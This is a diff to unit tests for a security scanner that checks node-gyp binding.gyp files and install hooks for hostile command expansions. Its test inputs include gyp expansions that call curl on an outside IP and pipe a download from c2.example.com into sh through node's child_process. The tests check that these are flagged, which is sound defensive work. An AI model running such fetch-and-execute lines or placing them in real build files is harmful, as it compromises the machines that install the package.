@@ -91,8 +91,13 @@ class ScanGypExpansionTests(unittest.TestCase):
     def test_suspicious_expansions_stay_critical(self):
         (issue,) = core.scan_gyp("binding.gyp", "{'variables': {'v': '<!(curl -s http://192.0.2.1/x)'}}")
         self.assertEqual(issue["sev"], "CRITICAL")
-        (issue,) = core.scan_gyp("binding.gyp", "{'variables': {'v': '^!(node -e \"eval(x)\")'}}")
+        (issue,) = core.scan_gyp("binding.gyp", "{'variables': {'v': '^!(node -e \"require(\\'child_process\\')"
+                                                ".execSync(\\'curl https://c2.example.com/p | sh\\')\")'}}")
         self.assertEqual(issue["sev"], "CRITICAL")
+        # (0.1.8) a download or evaluation tool is only a hint: eval of a name it never sets does nothing hostile
+        (issue,) = core.scan_gyp("binding.gyp", "{'variables': {'v': '^!(node -e \"eval(x)\")'}}")
+        self.assertEqual(issue["sev"], "MAJOR")
+        self.assertIn("runs a download or evaluation command", issue["msg"])
 
     def test_a_file_run_by_several_expansions_is_listed_once_on_its_line(self):
         rows = ["{", " 'variables': {"]
@@ -147,7 +152,7 @@ class DependencyGypTests(unittest.TestCase):
         shutil.rmtree(cls.root, ignore_errors=True)
 
     def test_the_miasma_replica_is_critical(self):
-        env = "reads environment variables or credential files and sends data over the network"
+        env = "sends environment variables over the network (the whole environment)"
         implicit = "\"install (implicit)\" script runs code at install time: 'node-gyp rebuild'."
         self.assertIn(("node_modules/miasma/binding.gyp", "CRITICAL", f"Install hook runs index.js, which {env}."),
                       self.hooks)
